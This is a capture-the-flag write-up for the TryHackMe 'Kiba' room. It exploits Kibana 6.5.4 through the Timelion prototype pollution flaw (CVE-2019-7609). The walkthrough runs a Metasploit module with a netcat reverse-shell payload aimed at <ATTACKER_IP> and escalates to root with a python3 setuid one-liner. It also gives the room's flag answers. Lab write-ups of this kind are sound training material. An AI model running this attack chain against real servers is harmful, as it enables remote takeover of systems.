# [kiba](https://tryhackme.com/room/kiba)

## Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.

# Flags

### What is the vulnerability that is specific to programming languages with prototype-based inheritance?

**Answer:** Prototype pollution

---

### What is the version of visualization dashboard installed in the server?

1. Perform a port scan:

```bash
nmap -sV -p- <TARGET_IP>
```

**Scan Results:**

```
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
5044/tcp open  lxi-evntsvc?
5601/tcp open  http         Elasticsearch Kibana (serverName: kibana)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Navigate to the Management section at `http://<TARGET_IP>:5601/app/kibana#/management?_g=()`. The version information is displayed in the interface as **6.5.4**.

<img width="596" height="676" alt="SCREEN01" src="https://github.com/user-attachments/assets/e766fc8d-d6cf-43a3-816f-bb69219b4d71" />

---

### What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

**Answer:** [CVE-2019-7609](https://nvd.nist.gov/vuln/detail/cve-2019-7609)

---

### Compromise the machine and locate user.txt

1. Use Metasploit to exploit the Kibana Timelion prototype pollution vulnerability. This exploit allows remote code execution by leveraging the prototype pollution flaw in the Timelion visualizer:

```bash
msfconsole -q
use exploit/linux/http/kibana_timelion_prototype_pollution_rce
set RHOSTS <TARGET_IP>
set RPORT 5601
set LHOST <ATTACKER_IP>
set LPORT 4444
set payload cmd/unix/reverse_netcat
exploit
```

2. Once the exploit succeeds, you'll get a reverse shell connection. Navigate to the kiba user's home directory and read the user flag:

```bash
cd /home/kiba
cat user.txt
```

<img width="297" height="170" alt="SCREEN01" src="https://github.com/user-attachments/assets/39780294-b27e-4383-8bf1-d90a0d801788" />

---

### How would you recursively list all of these capabilities?

**Answer:** `getcap -r /`

---

### Escalate privileges and obtain root.txt

1. Search for files with special Linux capabilities that could be exploited for privilege escalation. The `-r` flag searches recursively, and `2>/dev/null` suppresses error messages:

```bash
getcap -r / 2>/dev/null
```

**Results:**

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

2. The critical finding is `/home/kiba/.hackmeplease/python3` with the `cap_setuid+ep` capability. This capability allows the Python binary to change the effective user ID. We can exploit this to escalate to root by using `os.setuid(0)` to set our UID to 0 (root):

```bash
cd /home/kiba/.hackmeplease
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
whoami
# root
```

3. Navigate to the root directory and read the final flag:

```bash
cat /root/root.txt
```

<img width="526" height="207" alt="SCREEN02" src="https://github.com/user-attachments/assets/5b5df0d7-3ed1-4d71-91f2-462339b5f8fa" />
